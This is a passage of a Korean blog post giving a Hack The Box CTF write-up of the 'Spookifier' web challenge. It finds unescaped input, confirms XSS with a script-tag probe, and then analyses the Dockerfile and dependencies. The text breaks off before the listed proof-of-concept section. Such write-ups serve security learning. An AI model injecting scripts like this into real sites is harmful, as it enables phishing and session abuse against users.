@@ -1,0 +1,1275 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Hack The Box - Spookifier 사례 분석">
+      
+      
+        <meta name="author" content="fromitive">
+      
+      
+        <link rel="canonical" href="https://fromitive.github.io/fromitive-blog/security/2025-04-23-HTB/">
+      
+      
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.16">
+    
+    
+      
+        <title>"그냥 보여주는 거잖아요" 라고 말했던 코드의 결말 - fromitive's blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.7e37652d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-Y55B987JCP"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-Y55B987JCP",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-Y55B987JCP",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content=""그냥 보여주는 거잖아요" 라고 말했던 코드의 결말 - fromitive's blog" >
+      
+        <meta  property="og:description"  content="Hack The Box - Spookifier 사례 분석" >
+      
+        <meta  property="og:image"  content="https://fromitive.github.io/fromitive-blog/assets/images/social/security/2025-04-23-HTB.png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="https://fromitive.github.io/fromitive-blog/security/2025-04-23-HTB/" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content=""그냥 보여주는 거잖아요" 라고 말했던 코드의 결말 - fromitive's blog" >
+      
+        <meta  name="twitter:description"  content="Hack The Box - Spookifier 사례 분석" >
+      
+        <meta  name="twitter:image"  content="https://fromitive.github.io/fromitive-blog/assets/images/social/security/2025-04-23-HTB.png" >
+      
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="teal">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#spookifier" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="fromitive&#39;s blog" class="md-header__button md-logo" aria-label="fromitive's blog" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.56 9.09C14.66 7.18 12.54 6 11 6c.47 1.4.28 2.57-.05 3.43C8.45 10 6 11 6 11S3 7 1 7l2 6-1 4c2 0 4-3 4-3s5 2 8 2v2c.65 0 1.91-.83 2.73-2.23 1.24-.21 2.27-.56 3.14-.96-.15-.18-.34-.37-.59-.51-.65-.39-1.46-.63-2.28-.8.82-.16 1.67-.28 2.59-.15.46.06.95.19 1.41.51.1.06.17.14.24.19C22.4 13.26 23 12.44 23 12c0-.87-3.81-2.5-7.44-2.91M18 12c-.55 0-1-.45-1-1 0-.24.1-.45.23-.62.61.12 1.2.29 1.74.46.03.05.03.1.03.16 0 .55-.45 1-1 1"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            fromitive's blog
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              "그냥 보여주는 거잖아요" 라고 말했던 코드의 결말
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="teal"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="teal"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 2c-1.05 0-2.05.16-3 .46 4.06 1.27 7 5.04 7 9.54s-2.94 8.27-7 9.54c.95.3 1.95.46 3 .46a10 10 0 0 0 10-10A10 10 0 0 0 9 2"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Security
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../project/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Project
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../archive/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Archive
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../coding-interview/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Coding Interview
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../cs/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  CS
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../tips/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Tips
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="fromitive&#39;s blog" class="md-nav__button md-logo" aria-label="fromitive's blog" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.56 9.09C14.66 7.18 12.54 6 11 6c.47 1.4.28 2.57-.05 3.43C8.45 10 6 11 6 11S3 7 1 7l2 6-1 4c2 0 4-3 4-3s5 2 8 2v2c.65 0 1.91-.83 2.73-2.23 1.24-.21 2.27-.56 3.14-.96-.15-.18-.34-.37-.59-.51-.65-.39-1.46-.63-2.28-.8.82-.16 1.67-.28 2.59-.15.46.06.95.19 1.41.51.1.06.17.14.24.19C22.4 13.26 23 12.44 23 12c0-.87-3.81-2.5-7.44-2.91M18 12c-.55 0-1-.45-1-1 0-.24.1-.45.23-.62.61.12 1.2.29 1.74.46.03.05.03.1.03.16 0 .55-.45 1-1 1"/></svg>
+
+    </a>
+    fromitive's blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Security
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../project/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Project
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../archive/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Archive
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../coding-interview/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Coding Interview
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tips/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Tips
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#spookifier" class="md-nav__link">
+    <span class="md-ellipsis">
+      Spookifier 문제 분석
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Spookifier 문제 분석">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-api" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. API 확인
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. 입력 값 필터링 확인
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. 클라이언트 공격 실행
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#spookifier_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Spookifier 소스코드 분석
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Spookifier 소스코드 분석">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dockerfile" class="md-nav__link">
+    <span class="md-ellipsis">
+      실행 환경 DockerFile 분석
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="실행 환경 DockerFile 분석">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      의존성 분석
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      실행 지점 분석
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      소스코드 분석
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="소스코드 분석">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#runpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      run.py
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mainpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      main.py
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#routespy" class="md-nav__link">
+    <span class="md-ellipsis">
+      routes.py
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#utilpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      util.py
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      원인은 어디에 있을까?
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="원인은 어디에 있을까?">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#poc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Poc 작성
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      그럼 어떻게 대응해야 할까?
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="그럼 어떻게 대응해야 할까?">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. 사용자 입력 값을 신뢰하지 마세요
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. 만든 기능에 대한 실패 테스트 코드를 작성하세요
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. 로깅 전략을 잘 세워주세요
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      결론
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>"그냥 보여주는 거잖아요" 라고 말했던 코드의 결말</h1>
+
+<div class="admonition info">
+<p class="admonition-title">문제링크</p>
+<p>https://app.hackthebox.com/challenges/413</p>
+</div>
+<p>개발자가 입력값을 제대로 통제하지 않으면 어떻게 될까요? 심각할 경우 서버가 장악될 수 있습니다. 이번 블로그에서는 그 위험성을 알리기 위해 HTB(Hack The Box)에서 제공하는 CTF('catch the flag')<sup id="fnref:1"><a class="footnote-ref" href="#fn:1">1</a></sup>문제인 Spookifier 사례를 살펴보겠습니다.</p>
+<h2 id="spookifier">Spookifier 문제 분석</h2>
+<p>문제에 접속하면 다음과 같이  이름을 입력하는 칸과 <code>Spookify</code>버튼을 볼 수 있어요.</p>
+<figure>
+<p><img alt="Image title" src="/fromitive-blog/assets/2025-04-23/HTB1.png" /></p>
+</figure>
+<p>제 이름을 입력해서 Spookify 버튼을 누르니까 폰트가 변환된 제 닉네임을 볼 수 있어요. 기능은 이게 전부입니다.</p>
+<figure>
+<p><img alt="Image title" src="/fromitive-blog/assets/2025-04-23/HTB2.png" /></p>
+</figure>
+<h3 id="1-api">1. API 확인</h3>
+<p>이제 Spookify 버튼을 눌렀을 때 어떤 일이 일어나는지 살펴봅시다. 우선 어떤 API를 호출해서 응답값을 반영하는지 확인하기 위해 <strong>개발자 도구</strong>를 엽니다.</p>
+<p><code>Network</code>탭에서 <code>Spookify</code>버튼을 눌렀을 때 넘겨지는 값을 확인해 보니, <code>?text=이름</code>을 요청하면 자신이 입력한 문자열을 기반으로 응답값을 반환하는 것으로 분석됩니다.</p>
+<figure>
+<p><img alt="Image title" src="/fromitive-blog/assets/2025-04-23/HTB3.png" /></p>
+</figure>
+<h3 id="2">2. 입력 값 필터링 확인</h3>
+<p>제가 요청한 값을 그대로 응답하기 때문에 HTML을 구성하는 특수문자가 처리되지 않게 필터링(escape) 되는지 확인해봅시다.</p>
+<p>입력값에 <code>'(작은따옴표), &lt;&gt;(꺽쇠), "(큰따옴표), &amp;(앤드),</code>등을 요청하면 응답 값이 그대로 전달되는 것을 볼 수 있습니다. 이를 제대로 처리하지 않을 경우 공격자는 XSS(크로스 사이트 스크립팅) 공격이 가능하게 됩니다. </p>
+<figure>
+<p><img alt="Image title" src="/fromitive-blog/assets/2025-04-23/HTB4.png" /></p>
+</figure>
+<h3 id="3">3. 클라이언트 공격 실행</h3>
+<p>입력 값에 <code>&lt;script&gt;console.log('test');&lt;/script&gt;</code>를 입력하면 console 창에 사용자가 입력한 출력 문구가 그대로 나오는 것을 볼 수 있으며, 이를 악용할 경우 피싱 사이트 이동, 다른 사용자 권한으로 대신 요청하는 CSRF 공격 등 시나리오에 이용할 수 있는 공격에 활용할 수 있습니다.</p>
+<figure>
+<p><img alt="Image title" src="/fromitive-blog/assets/2025-04-23/HTB5.png" /></p>
+</figure>
+<p>하지만 이 문제는 클라이언트 측에 스크립트를 실행하여 flag 값을 획득하기에는 제약사항이 많습니다. 웹 기능이 저 메인페이지 한 개 뿐이고, 회원 기반 서비스가 아니기 때문에 활용하기가 어려웠습니다. </p>
+<p>이런 경우는 힌트를 얻기 위해 해당 웹 서비스의 소스코드 분석이 필요하다고 판단했습니다.</p>
+<h3 id="spookifier_1">Spookifier 소스코드 분석</h3>
+<p>Spookifier의 디렉터리 구조는 다음과 같습니다. 개발자가 직접 작성한 백엔드 코드는 <code>util, routes, main, run</code> 정도가 되는 것으로 보여요. 그리고 저희의 목표인 <code>flag.txt</code>파일이 보이네요.</p>
+<figure>
+<p><img alt="Image title" src="/fromitive-blog/assets/2025-04-23/HTB6.png" /></p>
+</figure>
+<h4 id="dockerfile">실행 환경 DockerFile 분석</h4>
+<p><code>DockerFile</code>을 살펴보면 서비스가 어떻게 배포되는지 확인할 수 있어요. 우선 눈에 띄는 것은 <strong>패키지 의존성 입니다. 취약한 의존성을 발견하면 그틈을 이용해서 공격이 가능하기 때문입니다.</strong></p>
+<h5 id="_1">의존성 분석</h5>
+<p>해당 머신에선 Flask 2.0.0버전, mako, flask_mako, Werkzeug 2.0.0버전을 사용하네요 특히 특정 버전을 사용하고 있어서 관련 CVE가 있는지 살펴봐야겠습니다.</p>
+<p>Falsk 2.0.0 버전에는 <code>CVE-2023-30861</code> 취약점이 존재하는데, 해당 CTF 만들 시점에는 반영이 되지 않아 이 취약점을 이용해서 해결하는 문제는 아닙니다.</p>
+<p>mako, flask_mako는 <a href="http://www.makotemplates.org/">Mako Templating</a>을 지원하는 패키지라고 합니다. 추측으로는 저희 입력값을 html 형태로 변환해주는 역할을 해주는 것으로 분석됩니다.</p>
+<p>Werkzeug는 웹 서비스를 디버깅 하기 위해 필요한 의존성으로 보입니다. 현재 개발자가 작성한 코드에는 활용하는 구문이 없는 것 같습니다. </p>
+<h5 id="_2">실행 지점 분석</h5>
+<p><code>ENTRYPOINT</code>를 살펴보면 <code>supervisord</code>를 실행하는 것을 확인할 수 있는데 해당 프로그램은 도커안에 여러 프로세스를 실행시키기 위해 활용된다고 합니다<sup id="fnref:3"><a class="footnote-ref" href="#fn:3">2</a></sup>. supervisord는 <code>supervisord.conf</code> 파일의 정보를 이용해 앱 실행정보를 설정하고 실행하는 것으로 보입니다. 저희의 목표인 flag.txt는 <code>/</code> 디렉터리에 위치하고 있어요.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="k">FROM</span><span class="w"> </span><span class="s">python:3.8-alpine</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="k">RUN</span><span class="w"> </span>apk<span class="w"> </span>add<span class="w"> </span>--no-cache<span class="w"> </span>--update<span class="w"> </span>supervisor<span class="w"> </span>gcc
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="c"># Upgrade pip</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="k">RUN</span><span class="w"> </span>python<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>--upgrade<span class="w"> </span>pip
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="c"># Install dependencies</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="k">RUN</span><span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span><span class="nv">Flask</span><span class="o">==</span><span class="m">2</span>.0.0<span class="w"> </span>mako<span class="w"> </span>flask_mako<span class="w"> </span><span class="nv">Werkzeug</span><span class="o">==</span><span class="m">2</span>.0.0
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="c"># Copy flag</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="k">COPY</span><span class="w"> </span>flag.txt<span class="w"> </span>/flag.txt
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="c"># Setup app</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="k">RUN</span><span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>/app
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="c"># Switch working environment</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="k">WORKDIR</span><span class="w"> </span><span class="s">/app</span>
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="c"># Add application</span>
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="k">COPY</span><span class="w"> </span>challenge<span class="w"> </span>.
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="c"># Setup supervisor</span>
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="k">COPY</span><span class="w"> </span>config/supervisord.conf<span class="w"> </span>/etc/supervisord.conf
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="c"># Expose port the server is reachable on</span>
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="k">EXPOSE</span><span class="w"> </span><span class="s">1337</span>
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="c"># Disable pycache</span>
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="k">ENV</span><span class="w"> </span><span class="nv">PYTHONDONTWRITEBYTECODE</span><span class="o">=</span><span class="m">1</span>
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="c"># start supervisord</span>
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="k">ENTRYPOINT</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;/usr/bin/supervisord&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;/etc/supervisord.conf&quot;</span><span class="p">]</span>
+</code></pre></div>
+<p>sypervisord.conf 파일을 확인했어요. Windows-INI 형태의 설정 파일이고 <code>program:flask</code> 부분에서 <code>/app/run.py</code>를 실행하는 것을 찾았습니다. </p>
